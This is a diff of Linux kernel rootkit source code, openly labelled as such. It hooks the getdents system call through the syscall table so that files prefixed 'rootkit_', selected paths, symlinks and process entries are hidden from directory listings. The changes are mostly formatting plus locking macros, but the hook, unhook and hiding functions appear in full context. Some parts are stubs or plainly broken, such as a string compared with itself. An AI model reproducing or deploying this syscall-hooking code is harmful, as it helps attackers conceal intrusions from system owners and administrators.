@@ -4,7 +4,6 @@
  */
 #include <asm/uaccess.h>
 #include <linux/delay.h>
-#include <linux/spinlock.h>
 #include <linux/unistd.h>
 
 #include "include.h"
@@ -28,7 +27,8 @@ static unsigned long getdents_lock_flags;
  * path we are currently in, *d_name is the name of the
  * file to check.
  */
-int hide_fpath(int fd, char *d_name)
+int
+hide_fpath(int fd, char *d_name)
 {
 	// TODO: loop the list of paths to hide
 	if(strcmp(d_name, d_name) == 0)
@@ -43,7 +43,8 @@ int hide_fpath(int fd, char *d_name)
  * Check whether we need to hide this file because 
  * of its prefix
  */
-int hide_fprefix(char *d_name)
+int
+hide_fprefix(char *d_name)
 {
 	// TODO: implement dynamic prefixes
 	if(strstr(d_name, "rootkit_") == d_name) 
@@ -62,14 +63,16 @@ int hide_fprefix(char *d_name)
  * check if we need to hide a file because it is the process
  * id of a hidden process. fd must match the /proc/ folder.
  */
-int hide_process(int fd, char *d_name)
+int
+hide_process(int fd, char *d_name)
 {	
 	// TODO
 	
 	return 0;
 }
 
-int hide_symlink(int fd, char *d_name)
+int
+hide_symlink(int fd, char *d_name)
 {
 	mm_segment_t old_fs;
 	char lpath[128];
@@ -99,7 +102,8 @@ int hide_symlink(int fd, char *d_name)
  * Checks whether a linux_dirent is a symbolic link and if it is
  * checks whether we need to hide it, too.
  */
-int check_symlink(char *path)
+int
+check_symlink(char *path)
 {
 	char *ptr, *name;
 	char delimiter = '/';
@@ -120,12 +124,11 @@ int check_symlink(char *path)
  * Our manipulated getdents syscall. It checks whether a particular file needs to be hidden.
  * If it matches then don't show, otherwise works normally and calls the original getdents.
  */
-asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
+asmlinkage int
+manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
 	/* lock and increase the call counter */
-	spin_lock_irqsave(getdents_lock, getdents_lock_flags);
-	getdents_call_counter++;
-	spin_unlock_irqrestore(getdents_lock, getdents_lock_flags);
+	INCREASE_CALL_COUNTER(getdents_call_counter, getdents_lock, getdents_lock_flags);
 		
 	long ret;
 	int len = 0;
@@ -162,17 +165,16 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 	}
 	
 	/* lock and decrease the call counter */
-	spin_lock_irqsave(getdents_lock, getdents_lock_flags);
-	getdents_call_counter--;
-	spin_unlock_irqrestore(getdents_lock, getdents_lock_flags);
-		
+	DECREASE_CALL_COUNTER(getdents_call_counter, getdents_lock, getdents_lock_flags);
+
 	return ret;
 }
 
 /*
  * hooks the system call 'getdents'
  */
-void hook_getdents(void) {
+void
+hook_getdents(void) {
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 	
 	/* initialize our spinlock for the getdents counter */
@@ -197,7 +199,8 @@ void hook_getdents(void) {
 /*
  * restores the original system call 'getdents'
  */
-void unhook_getdents(void) {
+void
+unhook_getdents(void) {
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 
 	/* disable write protection */
